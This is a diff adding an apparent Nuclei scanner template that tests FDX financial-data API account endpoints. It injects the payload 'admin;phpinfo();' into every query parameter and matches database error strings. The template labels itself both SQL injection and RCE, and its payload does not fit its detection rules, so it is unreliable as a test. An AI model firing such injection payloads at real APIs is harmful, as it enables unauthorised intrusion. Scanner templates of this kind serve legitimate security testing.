@@ -1,0 +1,37 @@
+id: FDX-API-Security-Tests-SQLi
+
+info:
+  name: FDX API Tests RCE
+  author: 0x240x23elu & OFJAAAH & vtobi
+  severity: critical
+  description: |
+    FDX API Remote Code Execution Tests.
+  reference:
+    - https://www.financialdataexchange.org/FDX/FDX/News/Press-Releases/Financial_Data_Exchange_Releases_FDX_API_5.0.aspx
+  tags: fdx
+
+
+requests:
+  - raw:
+      - |
+        GET /fdx/v4/accounts?accountIds=§rce§&startTime=§rce§&endTime=§rce§&resultType=lightweight&offset=§rce§&limit=§rce§ HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{JWT}} 
+        Connection: keep-alive
+    payloads:
+      rce:
+         - "admin;phpinfo();"
+    attack: batteringram
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "SQL syntax.*MySQL|Warning.*mysql_.*|valid MySQL result|MySqlClient.|mysqli_error|mysqli_query"
+          - "PostgreSQL.*ERROR|Warning.*Wpg_.*|valid PostgreSQL resultNpgsql."
+#          - "Driver.* SQL[-_ ]*Server|OLE DB.* SQL Server|(W|A)SQL Server.*Driver|Warning.*mssql_.*|(W|A)SQL Server.*[0-9a-fA-F]{8}|(?s)Exception.*WSystem.Data.SqlClient.|(?s)Exception.*WRoadhouse.Cms.)"
+          - "Microsoft Access Driver|JET Database Engine|Access Database Engine"
+          - "ORA-[0-9][0-9][0-9][0-9]|Oracle error|Oracle.*Driver|Warning.*Woci_.*|Warning.*Wora_.*"
+          - "CLI Driver.*DB2|DB2 SQL error|bdb2_w+"
+          - "SQLite/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException|Warning.*sqlite_.*|Warning.*SQLite3::|SQLITE_ERROR"
+          - "(?i)Warning.*sybase.*|Sybase message|Sybase.*Server message.*"
